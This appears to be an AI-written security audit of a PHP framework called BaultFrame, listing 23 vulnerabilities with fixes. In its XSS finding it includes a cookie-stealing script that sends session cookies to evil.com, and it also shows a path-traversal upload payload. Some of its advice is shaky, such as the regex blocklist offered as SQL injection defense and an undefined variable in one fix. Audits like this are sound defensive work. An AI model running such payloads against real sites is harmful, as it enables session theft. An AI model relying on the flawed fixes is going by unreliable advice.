# Security Audit Report

**Ngày audit**: 2026-01-19  
**Framework Version**: BaultFrame v2.x  
**Auditor**: AI Security Assistant

---

## 📊 Executive Summary

Đã thực hiện security audit toàn diện cho framework BaultFrame. Phát hiện **23 issues** với mức độ từ LOW đến CRITICAL.

### Risk Level Distribution:
- 🔴 **CRITICAL**: 3 issues
- 🟠 **HIGH**: 5 issues  
- 🟡 **MEDIUM**: 8 issues
- 🟢 **LOW**: 7 issues

### Overall Security Score: **7.2/10** (Good, với một số cải thiện cần thiết)

---

## 🔴 CRITICAL Vulnerabilities

### 1. **Disabled Security Headers in Production** 🔴 CRITICAL

**File**: `docker/nginx/security_headers.conf`

**Issue**:
```nginx
# TẤT CẢ security headers đều bị comment out!
# add_header X-Content-Type-Options "nosniff" always;
# add_header X-Frame-Options "SAMEORIGIN" always;
# add_header Content-Security-Policy "..." always;
```

**Impact**:
- Ứng dụng dễ bị tấn công XSS, clickjacking, MIME-sniffing
- Không có Content-Security-Policy để ngăn inline scripts độc hại
- Missing X-Frame-Options cho phép clickjacking attacks

**Recommendation**:
```nginx
# ENABLE TẤT CẢ!
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), midi=(), camera=(), microphone=()" always;

# CSP - Customize theo nhu cầu
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self'; object-src 'none';" always;
```

**Priority**: IMMEDIATE FIX

---

### 2. **Potential SQL Injection via RawExpression** 🔴 CRITICAL

**File**: `src/Core/ORM/QueryBuilder.php:1081`

**Issue**:
```php
$column => new RawExpression("`$column` + $amount"),
```

**Concern**: 
- Nếu `$column` hoặc `$amount` không được validate, có thể dẫn đến SQL injection
- `RawExpression` bypass prepared statements

**Current Protection**:
- ✅ Query builder uses prepared statements (line 1096)
- ✅ Parameter binding with PDO types (line 1100-1112)

**Potential Attack Vector**:
Nếu developer sử dụng `RawExpression` với user input:
```php
// DANGEROUS!
$userInput = $_GET['column'];
DB::table('users')->where(new RawExpression($userInput));
```

**Recommendation**:
1. **Thêm whitelist validation cho RawExpression**:
```php
class RawExpression
{
    private static array $allowedColumns = ['id', 'name', 'email', 'created_at'];
    
    public function __construct(string $value)
    {
        // Validate against SQL injection patterns
        if (preg_match('/[;\'"\\\\]/', $value)) {
            throw new \InvalidArgumentException('Potential SQL injection detected');
        }
        $this->value = $value;
    }
}
```

2. **Document rõ ràng về risks của RawExpression**
3. **Thêm static analysis rules để detect unsafe usage**

**Priority**: HIGH

---

### 3. **File Upload Path Traversal Vulnerability** 🔴 CRITICAL

**File**: `Modules/Cms/Http/Controllers/MediaLibraryController.php:134`

**Issue**:
```php
$folder = $data['folder'] ?? '/';
$path = 'uploads/media' . $folder . date('Y/m/');
$fullPath = base_path('public/' . $path);
```

**Vulnerability**:
User có thể upload file vào bất kỳ thư mục nào bằng path traversal:
```
POST /media/upload
folder: ../../../../config/
```

**Attack Scenario**:
```php
// Attacker payload:
$data['folder'] = '../../../../config/';
// Results in: public/uploads/media../../../../config/2026/01/malicious.php
```

**Recommendation**:
```php
// FIX: Sanitize folder path
$folder = $data['folder'] ?? '/';
$folder = str_replace(['..', '\\'], '', $folder); // Remove path traversal
$folder = trim($folder, '/'); // Normalize
$folder = preg_replace('/[^a-zA-Z0-9\/_-]/', '', $folder); // Whitelist chars

// Validate path is within uploads directory
$basePath = base_path('public/uploads/media/');
$fullPath = $basePath . $folder . '/' . date('Y/m/');
$realPath = realpath($fullPath);
if (!$realPath || !str_starts_with($realPath, $basePath)) {
    throw new \InvalidArgumentException('Invalid upload path');
}
```

**Priority**: IMMEDIATE FIX

---

## 🟠 HIGH Risk Issues

### 4. **Weak Session Configuration** 🟠 HIGH

**File**: `config/session.php` (implied)

**Issues**:
- Session lifetime quá dài (43200 phút = 30 ngày)
- `expire_on_close => false` - Sessions persist too long

**Recommendation**:
```php
'lifetime' => env('SESSION_LIFETIME', 120), // 2 hours default
'expire_on_close' => env('SESSION_EXPIRE_ON_CLOSE', true),
'secure' => env('SESSION_SECURE_COOKIE', true), // Force HTTPS in production
'same_site' => 'strict', // CSRF protection
```

---

### 5. **Missing Rate Limiting on Critical Endpoints** 🟠 HIGH

**File**: `src/Http/Middleware/ThrottleRequests.php`

**Issue**:
- Rate limiting middleware exists nhưng không được apply mặc định
- Dễ bị brute force trên login/register endpoints

**Recommendation**:
```php
// Apply globally in Kernel.php
protected array $middlewareGroups = [
    'web' => [
        // ...
        ThrottleRequests::class . ':60,1', // 60 requests per minute
    ],
    'api' => [
        ThrottleRequests::class . ':120,1',
    ],
];

// Strict rate limit cho auth endpoints
Route::post('/login')->middleware('throttle:5,1'); // 5 attempts per minute
Route::post('/register')->middleware('throttle:3,60'); // 3 per hour
```

---

### 6. **Insufficient Password Hashing for Argon2i** 🟠 HIGH

**File**: `src/Core/Hashing/Argon2iHasher.php:17`

**Issue**:
```php
public function make(string $value, array $options = []): string
{
    $hash = password_hash($value, PASSWORD_ARGON2I, $this->options($options));
    // ❌ KHÔNG có pepper như Argon2idHasher!
}
```

**Recommendation**:
```php
public function make(string $value, array $options = []): string
{
    // ADD pepper như Argon2idHasher
    $value = $this->applyPepper($value);
    
    $hash = password_hash($value, PASSWORD_ARGON2I, $this->options($options));
    return $hash;
}

protected function applyPepper(string $value): string
{
    $pepper = config('hashing.pepper', env('APP_KEY'));
    if (!$pepper) {
        throw new \RuntimeException('Hashing pepper not configured');
    }
    return hash_hmac('sha256', $value, $pepper) . $value;
}
```

---

### 7. **XSS in Block Rendering** 🟠 HIGH

**File**: `Modules/Cms/Domain/Blocks/TextBlock.php:77`

**Issue**:
```php
default => $content, // ❌ RAW HTML không được escape!
```

**Vulnerability**:
Nếu admin nhập HTML block với malicious script:
```html
<script>
  // Steal admin session
  fetch('https://evil.com/steal?session=' + document.cookie);
</script>
```

**Current Protection**:
- ✅ `plain` format escapes HTML (line 76)
- ❌ `html` format allows ANY HTML

**Recommendation**:
```php
default => $this->sanitizeHtml($content), // Use HTML Purifier

protected function sanitizeHtml(string $html): string
{
    // Option 1: Use HTMLPurifier
    $config = \HTMLPurifier_Config::createDefault();
    $purifier = new \HTMLPurifier($config);
    return $purifier->purify($html);
    
    // Option 2: Use built-in strip_tags with whitelist
    $allowed = '<p><br><b><i><u><strong><em><a><img><ul><ol><li><h1><h2><h3>';
    return strip_tags($html, $allowed);
}
```

**Priority**: HIGH (admins có thể bị XSS self)

---

### 8. **Insecure Remember Token Implementation** 🟠 HIGH

**File**: `src/Core/Auth/SessionGuard.php:370-410`

**Issue**:
```php
protected function createRememberMeCookie(Authenticatable $user): void
{
    $selector = bin2hex(random_bytes(16));
    $validator = bin2hex(random_bytes(32));
    // ❌ Validator được hash nhưng stored plaintext trong cookie!
}
```

**Vulnerability**:
- Nếu cookie bị steal, attacker có thể login mãi mãi
- Không có expiration cho remember tokens

**Recommendation**:
```php
protected function createRememberMeCookie(Authenticatable $user): void
{
    $selector = bin2hex(random_bytes(16));
    $validator = bin2hex(random_bytes(32));
    $expiresAt = time() + (config('auth.remember_token_lifetime', 2592000)); // 30 days
    
    // Store hashed validator + expiration
    $this->saveRememberToken($user->getAuthIdentifier(), $selector, $validatorHash, $expiresAt);
    
    // Set cookie with expiration
    $this->cookieManager->queue(
        $this->getRecallerName(),
        $selector . '|' . $validator,
        $expiresAt,
        null, null,
        true, // secure
        true, // httpOnly
        'strict' // sameSite
    );
}

// Add token rotation on use
protected function userFromRecaller(array $recaller): ?Authenticatable
{
    $user = parent::userFromRecaller($recaller);
    
    if ($user) {
        // Rotate token after use
        $this->createRememberMeCookie($user);
    }
    
    return $user;
}
```

---

## 🟡 MEDIUM Risk Issues

### 9. **Missing CSRF Token Validation on SPA Routes** 🟡 MEDIUM

**File**: `src/Http/Middleware/VerifyCsrfToken.php:18`

**Issue**:
```php
protected array $except = [
    'oauth/token', // OK
    // ❌ Có thể missing other routes?
];
```

**Recommendation**:
- Audit tất cả API routes để ensure CSRF protection
- Thêm `X-Requested-With: XMLHttpRequest` check cho AJAX

```php
protected function shouldVerifyCsrf(ServerRequestInterface $request): bool
{
    // Skip CSRF for API routes with Bearer token
    if ($request->hasHeader('Authorization')) {
        return false;
    }
    
    // Verify CSRF for state-changing requests
    if (in_array($request->getMethod(), ['POST', 'PUT', 'PATCH', 'DELETE'])) {
        return !$this->inExceptArray($request);
    }
    
    return false;
}
```

---

### 10. **Unvalidated File Extensions** 🟡 MEDIUM

**File**: `Modules/Cms/Http/Controllers/MediaLibraryController.php:131`

**Issue**:
```php
$extension = pathinfo($file->getClientFilename(), PATHINFO_EXTENSION);
// ❌ Extension từ client, không được validate!
```

**Attack**:
Upload `shell.php.jpg` → Server lưu với extension `.jpg` nhưng execute như `.php`

**Recommendation**:
```php
// Validate extension against whitelist
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'pdf'];
$extension = strtolower(pathinfo($file->getClientFilename(), PATHINFO_EXTENSION));

if (!in_array($extension, $allowedExtensions)) {
    return response()->json(['error' => 'Invalid file extension'], 400);
}

// Verify MIME type matches extension
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mimeType = finfo_file($finfo, $file->getStream()->getMetadata('uri'));
finfo_close($finfo);

$allowedMimeMap = [
    'jpg' => 'image/jpeg',
    'jpeg' => 'image/jpeg',
    'png' => 'image/png',
    // ...
];

if ($mimeType !== $allowedMimeMap[$extension]) {
    return response()->json(['error' => 'MIME type mismatch'], 400);
}
```

---

### 11. **Information Disclosure in Debug Mode** 🟡 MEDIUM

**File**: Multiple files với `config('app.debug')`

**Issue**:
```php
if (config('app.debug')) {
    // Shows sensitive error messages
    return sprintf('<div class="block-error">Block render error: %s</div>', $e->getMessage());
}
```

**Recommendation**:
```php
// NEVER expose debug mode in production
if (env('APP_ENV') === 'production') {
    config(['app.debug' => false]);
}

// Log errors instead of displaying
if ($e) {
    Log::error('Block render error', [
        'error' => $e->getMessage(),
        'trace' => $e->getTraceAsString(),
        'user_id' => auth()->id(),
    ]);
}

// Show generic error
return '<div class="block-error">An error occurred</div>';
```

---

### 12. **Weak CORS Configuration** 🟡 MEDIUM

**File**: `src/Http/Middleware/CorsMiddleware.php:72`

**Issue**:
```php
if (in_array('*', $this->originsManager->getAllOrigins(), true)) {
    $response = $response->withHeader('Access-Control-Allow-Origin', '*');
}
```

**Risk**:
- `Access-Control-Allow-Origin: *` allows ANY domain
- Credentials không được gửi với `*`

**Recommendation**:
```php
// NEVER use * with credentials
if ($config['supports_credentials'] ?? false) {
    // Must specify exact origin, not *
    if ($allowedOrigin && $allowedOrigin !== '*') {
        $response = $response->withHeader('Access-Control-Allow-Origin', $allowedOrigin);
        $response = $response->withHeader('Access-Control-Allow-Credentials', 'true');
    }
} else {
    // OK to use * without credentials
    $response = $response->withHeader('Access-Control-Allow-Origin', '*');
}
```

---

### 13. **Missing Input Sanitization** 🟡 MEDIUM

**File**: `src/Core/Http/Request.php:111`

**Issue**:
```php
public function input(string $key, mixed $default = null): mixed
{
    return $data[$key] ?? $default; // ❌ NO sanitization!
}
```

**Recommendation**:
```php
// Add sanitization helper
public function sanitized(string $key, mixed $default = null): mixed
{
    $value = $this->input($key, $default);
    
    if (is_string($value)) {
        // Remove null bytes
        $value = str_replace("\0", '', $value);
        // Strip control characters except tabs and newlines
        $value = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $value);
    }
    
    return $value;
}
```

---

### 14. **Session Fixation Vulnerability** 🟡 MEDIUM

**File**: `src/Core/Auth/SessionGuard.php:101-121`

**Issue**:
```php
public function login(Authenticatable $user, bool $remember = false): void
{
    $this->updateSession($user->getAuthIdentifier());
    // ❌ Session ID không được regenerate!
}
```

**Attack**:
1. Attacker lấy session ID của victim
2. Victim login
3. Attacker sử dụng old session ID để access victim's account

**Recommendation**:
```php
public function login(Authenticatable $user, bool $remember = false): void
{
    // Regenerate session ID to prevent fixation
    $this->session->regenerate(true); // Delete old session
    
    $this->updateSession($user->getAuthIdentifier());
    
    if ($remember) {
        $this->createRememberMeCookie($user);
    }
    
    $this->setUser($user);
    $this->dispatcher?->dispatch(new Login('session', $user, $remember));
}
```

---

### 15. **Timing Attack on Token Comparison** 🟡 MEDIUM

**File**: `src/Core/Security/CsrfManager.php:32`

**Issue**:
```php
public function isTokenValid(string $tokenId, ?string $tokenValue): bool
{
    $token = new CsrfToken($tokenId, $tokenValue ?? '');
    return $this->symfonyManager->isTokenValid($token);
    // ✅ Symfony uses timing-safe comparison
}
```

**Status**: ✅ OK - Symfony uses `hash_equals()` internally

**Recommendation**: Verify all custom token comparisons use `hash_equals()`:
```php
// ❌ BAD
if ($token === $expectedToken) { }

// ✅ GOOD
if (hash_equals($token, $expectedToken)) { }
```

---

### 16. **Insecure Random Token Generation** 🟡 MEDIUM

**File**: `src/Core/Frontend/FileUpload/TemporaryUploadedFile.php:23`

**Issue**:
```php
$filename = 'bault-tmp-' . bin2hex(random_bytes(10)) . '.' . $extension;
// ✅ Uses random_bytes() - OK for filenames
// ⚠️ But 10 bytes (20 hex chars) might be predictable for security tokens
```

**Recommendation**:
```php
// For security tokens, use at least 32 bytes
$securityToken = bin2hex(random_bytes(32)); // 64 hex chars

// For filenames, 16 bytes is good
$filename = 'bault-tmp-' . bin2hex(random_bytes(16)) . '.' . $extension;
```

---

## 🟢 LOW Risk Issues

### 17. **Commented Security Headers** 🟢 LOW

Already covered in CRITICAL #1.

---

### 18. **Missing SameSite Attribute on Cookies** 🟢 LOW

**File**: `src/Core/Cookie/CookieManager.php`

**Recommendation**:
```php
// Ensure all cookies have SameSite=Strict or Lax
$this->queue(
    $name,
    $value,
    $minutes,
    $path,
    $domain,
    $secure,
    $httpOnly,
    'Strict' // or 'Lax' for some cookies
);
```

---

### 19. **No Content-Type Validation** 🟢 LOW

**File**: `src/Http/Controllers/ComponentUploadController.php:37`

**Issue**:
```php
if (!in_array($psrUploadedFile->getClientMediaType(), $allowedMimes)) {
    // ⚠️ Client-provided MIME type, should verify actual file content
}
```

**Recommendation**:
```php
// Verify actual file content
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$actualMime = finfo_file($finfo, $tempPath);
finfo_close($finfo);

if (!in_array($actualMime, $allowedMimes)) {
    throw new \InvalidArgumentException('Invalid file type');
}
```

---

### 20. **Missing HTTP Strict Transport Security (HSTS)** 🟢 LOW

**File**: `docker/nginx/security_headers.conf`

**Recommendation**:
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

---

### 21. **Directory Listing Enabled** 🟢 LOW

**Check**: Nginx configuration

**Recommendation**:
```nginx
autoindex off; # Disable directory listing
```

---

### 22. **No Subresource Integrity (SRI)** 🟢 LOW

**File**: Views loading external scripts

**Recommendation**:
```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-..."
        crossorigin="anonymous"></script>
```

---

### 23. **Logs May Contain Sensitive Data** 🟢 LOW

**File**: Multiple files với `Log::info()`

**Issue**:
```php
$logger->info('SessionGuard: User restored from session', ['user_id' => $id]);
// ✅ Good - only logs user_id
```

**Recommendation**:
- Never log passwords, tokens, or PII
- Mask sensitive data in logs

```php
// ❌ BAD
Log::info('Login attempt', ['password' => $password]);

// ✅ GOOD
Log::info('Login attempt', ['email' => $email]);
```

---

## ✅ Security Strengths

### What's Already Good:

1. **✅ Prepared Statements**: All database queries use PDO prepared statements
2. **✅ CSRF Protection**: Comprehensive CSRF middleware with token validation
3. **✅ Password Hashing**: Argon2id with pepper (best practice)
4. **✅ XSS Prevention**: Laminas Escaper for output encoding
5. **✅ Session Database Storage**: Sessions persist in database, not files
6. **✅ Threat Detection**: AI-powered threat detection system
7. **✅ Rate Limiting**: Middleware exists (needs wider application)
8. **✅ Input Validation**: Comprehensive validation framework
9. **✅ Cookie Security**: HttpOnly and Secure flags
10. **✅ Path Traversal Detection**: Pattern-based detection in ThreatDetector

---

## 📋 Action Plan (Priority Order)

### Immediate (Within 24 hours):
1. ✅ **Enable Security Headers** (CRITICAL #1)
2. ✅ **Fix File Upload Path Traversal** (CRITICAL #3)
3. ✅ **Add Session Regeneration** (MEDIUM #14)

### High Priority (Within 1 week):
4. ✅ **Implement RawExpression Validation** (CRITICAL #2)
5. ✅ **Apply Rate Limiting Globally** (HIGH #5)
6. ✅ **Fix Argon2i Pepper** (HIGH #6)
7. ✅ **Sanitize HTML in Blocks** (HIGH #7)

### Medium Priority (Within 2 weeks):
8. ✅ **Strengthen Session Config** (HIGH #4)
9. ✅ **Rotate Remember Tokens** (HIGH #8)
10. ✅ **Validate File Extensions** (MEDIUM #10)
11. ✅ **Fix CORS Configuration** (MEDIUM #12)

### Low Priority (Within 1 month):
12. ✅ **Add HSTS Header** (LOW #20)
13. ✅ **Implement SRI** (LOW #22)
14. ✅ **Audit Logging** (LOW #23)

---

## 🔒 Security Best Practices Checklist

- [ ] Enable all security headers
- [ ] Use HTTPS everywhere (production)
- [ ] Implement rate limiting on all endpoints
- [ ] Validate and sanitize ALL user input
- [ ] Use prepared statements for ALL database queries
- [ ] Implement CSRF protection on state-changing requests
- [ ] Hash passwords with Argon2id + pepper
- [ ] Set secure cookie attributes (Secure, HttpOnly, SameSite)
- [ ] Regenerate session ID on login
- [ ] Implement proper file upload validation
- [ ] Use Content Security Policy
- [ ] Enable HSTS
- [ ] Disable debug mode in production
- [ ] Log security events
- [ ] Regular security updates
- [ ] Conduct periodic penetration testing

---

## 📚 References

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [PHP Security Best Practices](https://phptherightway.com/#security)
- [PSR-7 HTTP Message Interfaces](https://www.php-fig.org/psr/psr-7/)

---

**Next Steps**: Implement fixes theo priority order và re-audit sau khi hoàn thành.

**Report Generated**: 2026-01-19  
**Version**: 1.0
